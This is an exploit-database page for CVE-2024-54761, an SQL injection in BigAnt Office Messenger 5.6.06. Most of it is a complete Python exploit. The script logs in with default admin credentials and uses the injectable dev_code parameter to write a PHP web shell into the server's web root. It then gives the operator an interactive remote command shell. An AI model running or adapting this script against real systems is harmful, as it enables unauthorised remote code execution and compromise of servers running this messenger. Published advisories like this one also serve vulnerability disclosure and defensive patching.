---
title: BigAnt Office Messenger 5.6.06 SQL Injection
url: https://cxsecurity.com/issue/WLB-2025120008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-09
fetch_date: 2025-12-10T03:19:48.641681
---

# BigAnt Office Messenger 5.6.06 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **BigAnt Office Messenger 5.6.06 SQL Injection** **2025.12.09**  Credit:  **[Nicat Abbasov](https://cxsecurity.com/author/Nicat%2BAbbasov/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-54761](https://cxsecurity.com/cveshow/CVE-2024-54761/ "Click to see CVE-2024-54761")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: BigAnt Office Messenger 5.6.06 - SQL Injection
# Date: 01.09.2025
# Exploit Author: Nicat Abbasov
# Vendor Homepage: https://www.bigantsoft.com/
# Software Link: https://www.bigantsoft.com/download.html
# Version: 5.6.06
# Tested on: 5.6.06
# CVE : CVE-2024-54761
# Github repo: https://github.com/nscan9/CVE-2024-54761
import requests
from bs4 import BeautifulSoup
import base64
class Exploit:
def \_\_init\_\_(self, rhost, rport=8000, username='admin', password='123456'):
self.rhost = rhost
self.rport = rport
self.username = username.lower()
self.password = password
self.target = f'http://{self.rhost}:{self.rport}'
self.session = requests.Session()
self.headers = {
'User-Agent': 'Mozilla/5.0 (X11; Linux x86\_64; rv:128.0) Gecko/20100101 Firefox/128.0',
'X-Requested-With': 'XMLHttpRequest',
'Origin': self.target,
'Referer': f'{self.target}/index.php/Home/login/index.html',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
}
self.clientid\_map = {
'admin': '1',
'security': '2',
'auditor': '3',
'superadmin': '4',
}
self.clientid = self.clientid\_map.get(self.username, '4') # Default to 4 if unknown
def get\_tokens(self):
print("[\*] Fetching login page tokens...")
url = f'{self.target}/index.php/Home/login/index.html'
r = self.session.get(url, headers={'User-Agent': self.headers['User-Agent']})
soup = BeautifulSoup(r.text, 'html.parser')
tokens = {}
meta = soup.find('meta', attrs={'name': '\_\_hash\_\_'})
if meta:
tokens['\_\_hash\_\_'] = meta['content']
form = soup.find('form')
if form:
for hidden in form.find\_all('input', type='hidden'):
name = hidden.get('name')
value = hidden.get('value', '')
if name and name not in tokens:
tokens[name] = value
return tokens
def login(self):
tokens = self.get\_tokens()
if '\_\_hash\_\_' in tokens:
tokens['\_\_hash\_\_'] = tokens['\_\_hash\_\_']
encoded\_password = base64.b64encode(self.password.encode()).decode()
data = {
'saas': 'default',
'account': self.username,
'password': encoded\_password,
'to': 'admin',
'app': '',
'submit': '',
}
data.update(tokens)
login\_url = f'{self.target}/index.php/Home/Login/login\_post'
print(f"[\*] Logging in as {self.username}...")
resp = self.session.post(login\_url, headers=self.headers, data=data)
if resp.status\_code != 200:
print(f"[-] Login failed with HTTP {resp.status\_code}")
return False
try:
json\_resp = resp.json()
if json\_resp.get('status') == 1:
print("[+] Login successful!")
return True
else:
print(f"[-] Login failed: {json\_resp.get('info')}")
return False
except:
print("[-] Failed to parse login response JSON")
return False
def check\_redirect(self):
url = f'{self.target}/index.php/admin/public/load/clientid/{self.clientid}.html'
print(f"[\*] Checking for redirect after login to clientid {self.clientid} ...")
r = self.session.get(url, headers={'User-Agent': self.headers['User-Agent']}, allow\_redirects=False)
if r.status\_code == 302:
print(f"[+] Redirect found to {r.headers.get('Location')}")
return True
else:
print(f"[-] Redirect not found, got HTTP {r.status\_code}")
return False
def upload\_shell(self):
print("[\*] Uploading webshell via SQLi...")
payload = ';SELECT "<?php system($\_GET[\'cmd\']); ?>" INTO OUTFILE \'C:/Program Files (x86)/BigAntSoft/IM Console/im\_webserver/htdocs/shell.php\'-- -'
url = f'{self.target}/index.php/Admin/user/index/clientid/{self.clientid}.html'
params = {'dev\_code': payload}
r = self.session.get(url, params=params, headers={'User-Agent': self.headers['User-Agent']})
if r.status\_code == 200:
print("[+] Payload sent, checking the shell...")
self.check\_shell()
else:
print(f"[-] Failed to send payload, HTTP {r.status\_code}")
def check\_shell(self):
print("[\*] Enter shell commands to execute on the target. Empty command to exit.")
while True:
cmd = input("shell> ").strip()
if not cmd:
print("[\*] Exiting shell.")
break
shell\_url = f'{self.target}/shell.php?cmd={cmd}'
print(f"[\*] Sending command: {cmd}")
r = self.session.get(shell\_url)
if r.status\_code == 200 and r.text.strip():
print(r.text.strip())
else:
print("[-] No response or empty output from shell.")
def run(self):
if self.login():
if self.check\_redirect():
self.upload\_shell()
else:
print("[-] Redirect check failed, aborting.")
else:
print("[-] Login failed, aborting.")
if \_\_name\_\_ == '\_\_main\_\_':
import argparse
parser = argparse.ArgumentParser(description='Exploit for CVE-2024-54761 BigAntSoft SQLi to RCE')
parser.add\_argument('-r', '--rhost', required=True, help='Target IP address')
parser.add\_argument('-p', '--rport', default=8000, type=int, help='Target port (default 8000)')
parser.add\_argument('-u', '--username', default='admin', help='Login username (default admin)')
parser.add\_argument('-P', '--password', default='123456', help='Login password in plain text')
args = parser.parse\_args()
exploit = Exploit(args.rhost, args.rport, args.username, args.password)
exploit.run()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top